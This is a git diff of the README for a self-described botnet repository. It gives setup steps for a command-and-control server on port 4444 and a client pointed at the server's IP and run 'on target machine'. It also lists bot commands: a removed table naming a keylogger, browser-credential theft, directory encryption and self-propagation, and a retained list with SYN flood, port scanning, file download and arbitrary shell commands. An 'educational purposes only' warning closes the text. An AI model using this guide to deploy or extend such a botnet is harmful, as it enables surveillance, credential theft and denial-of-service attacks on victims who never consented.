@@ -64,47 +64,38 @@ This repository contains a proof-of-concept botnet with advanced features design
 
 ### For Client:
 - Python 3.6+
-- Windows OS (primary support)
 - Required Python packages:
   ```
-  pip install pycryptodome pynput paramiko scapy psutil pywin32 pyperclip netifaces wmi
+  pip install pycryptodome pynput paramiko scapy psutil pyperclip netifaces
   ```
 
 ## Installation
 
 ### 1. Clone the Repository
 ```bash
-git clone https://github.com/Rjkumarkumawat/Advanced-Botnet-Implementation.git
+git clone https://github.com/krushal7/Advanced-Botnet-Implementation.git
 cd Advanced-Botnet-Implementation
 ```
 
 ### 2. Server Setup
-1. Navigate to server directory:
-   ```bash
-   cd server
-   ```
-2. Install dependencies:
-   ```bash
-   pip install -r requirements.txt
-   ```
-3. Modify configuration (if needed) in `server.py`:
+1. Modify configuration (if needed) in `server.py`:
    ```python
-   # Change default port if needed
+   # Change default port if needed(optional)
    sock.bind(('0.0.0.0', 4444))  # Line 154
    ```
 
 ### 3. Client Setup
-1. Navigate to client directory:
+1. Create the virtual environment (named "venv")
    ```bash
-   cd client
+   python3 -m venv venv
    ```
-2. Install dependencies:
+2. Activate the virtual environment
    ```bash
-   pip install -r requirements.txt
+   source venv/bin/activate
    ```
 3. Modify configuration in `client.py`:
    ```python
-   # Change C2 server IP (line 442)
+   # Change C2 server IP
    server('192.168.1.102', 4444)  # Replace with your server IP
    ```
 
@@ -113,7 +104,6 @@ cd Advanced-Botnet-Implementation
 ### Server Configuration Options:
 - Edit `server.py` to change:
   - Listening port (default: 4444)
-  - Encryption key (AES_KEY and AES_IV - change for production)
   - Timeout settings
 
 ### Client Configuration Options:
@@ -127,7 +117,7 @@ cd Advanced-Botnet-Implementation
 
 ### Starting the C2 Server
 ```bash
-python server.py
+python3 server.py
 ```
 Expected output:
 ```
@@ -141,7 +131,7 @@ Expected output:
    ```
 2. Run on target machine:
    ```bash
-   python client.py
+   python3 client.py
    ```
    Or if compiled:
    ```bash
@@ -162,38 +152,24 @@ Expected output:
 |---------|-------------|
 | `targets` | List all connected bots |
 | `session [n]` | Connect to session number n |
-| `sendall [cmd]` | Send command to all connected bots |
 | `clear` | Clear the terminal screen |
 | `help` | Show help information |
 | `quit` | Shutdown the server |
 
 ### Bot Commands
-| Command | Description |
-|---------|-------------|
-| **System Commands** |
-| `check_priv` | Check administrator privileges |
-| `reboot` | Reboot the system |
-| `turn_off` | Shutdown the system |
-| **Surveillance** |
-| `start_keylogger` | Start capturing keystrokes |
-| `stop_keylogger` | Stop keylogger |
-| `steal_clipboard` | Get clipboard contents |
-| `steal_info` | Get system information |
-| `network_info` | Get network interface info |
-| **Credential Theft** |
-| `steal_creds` | Extract browser passwords |
-| **File Operations** |
-| `download [file]` | Download file from target |
-| `upload [file]` | Upload file to target |
-| `encrypt_dir [dir]` | Encrypt directory contents |
-| `decrypt_dir [dir]` | Decrypt directory contents |
-| **Network Attacks** |
-| `syn_flood [ip] [port]` | Start SYN flood attack |
-| `stop_syn_flood` | Stop SYN flood |
-| `port_scan [ip] [start] [end]` | Advanced port scan |
-| `scan_network [range]` | Scan network for hosts |
-| `spread [range]` | Attempt to propagate to other hosts |
-
+Available Commands:
+  help                    - Show this help
+  check_priv              - Check privileges
+  steal_info              - Detailed system info
+  network_info            - Network interfaces
+  port_scan IP START END  - Port scanner
+  syn_flood IP PORT       - SYN flood attack
+  stop_syn_flood          - Stop SYN flood
+  download FILE           - Download a file
+  reboot                  - Reboot the bot
+  turn_off                - Shutdown the bot
+  Any Linux command       - whoami, id, ls, cat, etc.
+  
 ## Security Warning
 ⚠️ **This is malware for educational purposes only.** ⚠️
 
